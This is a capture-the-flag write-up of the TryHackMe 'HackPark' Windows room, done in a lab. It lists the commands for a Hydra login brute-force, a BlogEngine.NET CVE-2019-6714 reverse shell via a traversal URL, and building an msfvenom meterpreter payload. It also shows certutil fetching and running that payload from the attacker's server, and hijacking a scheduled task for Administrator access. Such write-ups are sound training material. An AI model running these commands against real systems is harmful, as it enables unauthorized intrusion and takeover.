# 🤡 HackPark - TryHackMe Write-up

## 📌 Overview
The description of the room is: ״Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!״
This room is a intermediate-level penetration testing challenge on TryHackMe.
In this room you are asked to explore and enumerate a web-application, find a known CVE and exploit it, gain access to the machine, and retrieve flags.

Target IP: 10.113.155.246

---

## 1. Reconnaissance: 🔍
I initially performed enumeration with Nmap to identify open ports and services, version and OS on the target machine by using the following command:

```bash
nmap 10.113.155.246 -sV -sC -T5 -p- -A -O --min-rate 1000 -o ~/active/output/nmap_result.txt
```
The scan didn't work saying the host is offline. Since the host didn't answer to the ICMP packet, I added the -Pn flag and made nmap treat it as online. The scan showed the host as online now, but no open ports were identified. I decided to still check the address on Firefox's browser.

[Click here to view the Nmap scan result](output/nmap_result.txt)

The web application opened a social-media-like page with a post with pennywise's face and a nice welcome banner:
## <img width="1600" height="1231" alt="Screen Shot 2026-06-24 at 14 21 24 PM" src="https://github.com/user-attachments/assets/2612bb6a-772b-4b75-9ae3-f23d1bbe46da" />


---

## 2. Brute-forcing with Hydra: 🐉

After accessing the web application, I found on top-right corner a menu with a Login page which led me to http://10.113.155.246/Account/login.aspx?ReturnURL=/admin/
I used Burp-Suite and ProxyFoxy to intercept the communication between the browser and the web application and tested a login form for capture and analysis.

the following form was sent:
## <img width="3200" height="2466" alt="burpsuite" src="https://github.com/user-attachments/assets/b2c30118-5138-4d2c-9421-9892b230d63f" />

The image above shows us the request type is **POST**. and that we have a request with regular headers and a long string that starts with: __VIEWSTATE=...

after forwarding the request I got and error saying "Login failed.":
## <img width="798" height="673" alt="Screen Shot 2026-06-24 at 14 24 05 PM" src="https://github.com/user-attachments/assets/9bc94b7e-82d3-485a-abb9-41460b2b29af" />

I then created a hydra command to brute-force the login page the following way:

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
10.113.155.246 \
http-post-form \
"/Account/login.aspx?ReturnURL=/admin:\
__VIEWSTATE=...\
&__EVENTVALIDATION=...\
&ctl00%24MainContent%24LoginUser%24UserName=^USER^\
&ctl00%24MainContent%24LoginUser%24Password=^PASS^\
&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:\
F=Login failed" \
-t 64
```

This gave me the following hit:
## <img width="3198" height="2460" alt="bruteforce" src="https://github.com/user-attachments/assets/5466c702-6d03-4998-bdbc-7460095a00e4" />

and I was able to gain access to the admin panel.

---

## 3. Compromise the machine: 💥

We are asked in the following the question to find the version of the BlogEngine running.

I went to the "about" and found the following version:
## <img width="1282" height="384" alt="Screen Shot 2026-06-24 at 14 53 11 PM" src="https://github.com/user-attachments/assets/291172be-0010-44c1-bed6-5f8aabde7f44" />

The next task requires us to go to "Exploit Database" (An exploit database maintained by OffSec) and look for a CVE related to the specific blogengine.net version
The one that has a CVE is ״BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution (CVE-2019-6714)״

---

## 4. Exploiting the Vulnerability: ⛓️‍💥

the following steps were required to successfully exploit the vulnerability:

1. Create a listener for a port that isn't used for a reverse shell to connect to:

```bash
nc -lvnp {port}
```

2. Create a file called "PostView.ascx" and paste the malicious code at the bottom of the CVE report in it. Change the IP address and port to whatever the listener is on.

[My PostView.ascx](output/PostView.ascx)

3. Upload the file by editing an existing post and adding it (The file will be saved in the /App_Data/files directory)

4. Reach the following URL and check for connected machines on your listener!

```bash
http://10.113.155.246/?theme=../../App_Data/files
```

## <img width="1599" height="1229" alt="Screen Shot 2026-06-24 at 15 19 13 PM" src="https://github.com/user-attachments/assets/ecea5884-9ac8-4554-9b03-06d372175b86" />

---

## 5. Windows Privilege Escalation: 🛡️

In the following task we are asked to create a meterpreter session using msfvenom.

To make a payload to do so, I needed to know OS, CPU architecture, our IP and desired port to be connected to.

For that, I used sysinfo and recived the information I needed to make the payload.

The command I used to create the payload was:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.132.219 LPORT=9001 -f exe > meterpreter_payload.exe
```

The next step we need to do is transfer the payload to the machine. We can do this in many ways, I chose to do so by creating a **python http server** and download the file from our machine.
to start a python http server you only need to write:
```python
python3 -m http.server 8000
```

❗️ Before proceeding, you need to make sure you change the directory you are at to one you can download and execute. I used /Temp, but /Public is fine too.

Then, on the target machine, download the payload with either the CMD or PowerShell. I used CMD's command:
```cmd
certutil -urlcache -f "http://192.168.132.219:8000/meterpreter_payload.exe" meterpreter_payload.exe
```

After uploading the file, set up metasploit's multi-handler and run the payload:
```bash
msfconsole

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 9001
run
```

```cmd
start meterpreter_payload.exe
```

After making a more stable connection to the machine, I wanted to get the system information for the answers:
```bash
sysinfo
```

And then we find the following answer (which needs a removal of the word "Server" to be correct):
## <img width="3200" height="424" alt="Redacted" src="https://github.com/user-attachments/assets/c0ea564c-cdc4-4b57-8b97-bdd03d95246f" />

The next question is a little bit tricky. We are asked to find a name of service running automated tasks. when I looked for all the services using "ps" I was able to find the following string:
## <img width="1589" height="161" alt="Screen Shot 2026-06-24 at 16 22 36 PM" src="https://github.com/user-attachments/assets/a41b3b25-8e91-4088-9ddf-d95171b92ed1" />

I understood from this that the "W" in "WSchdule" is shortend "Windows" and therefore the name is "WindowsSchedule".

---

## 6. Exploiting a scheduled task to run the payload as Admin: 👑

I looked around the system and could see at "C:\Program Files (x86)\SystemScheduler" that there is a directory called "Events".
in it there is a log file named:[20198415519.INI_LOG.txt](output/20198415519.INI_LOG.txt)

This log file says that every minute an application called Messages.exe is ran by Administator automatically.
Since the executable was running with elevated privileges and the directory permissions allowed modification,
I decided to replace the executable with my own payload.

I used meterpreter's Download feature to get the payload to the current folder

```bash
download meterpreter_payload.exe
```

and then changed Message.exe to a different name, and changed the name of my payload to Message.exe.

I re-opened the multi-handler and recived a new connection as **Administrator**.

After that, I went to the \Users directory and checked out the desktop of both jeff and Administrator for the flags.

---

## Flags: 🏁 

* jeff's flag - C:\Users\jeff\Desktop\user.txt - 759bd...
* Admin's flag - C:\Users\Administrator\Desktop\root.txt - 7e13d...

---

## Key Takeaways: 🧠

* A target may appear as offline in some scans but it is always worth adding in situations like this the -Pn flag to verify
* Automated tasks shouldn't be used with Admin privilieges and should be used with Least Privilieges possible. Locking the application from changes by anyone is also important.
* Checking CVEs for vulnerabilities is a basic skill for every penetration tester.

---

## Disclaimer: ⚠️

This work was performed in a controlled, legal lab environment provided by TryHackMe for educational purposes only.
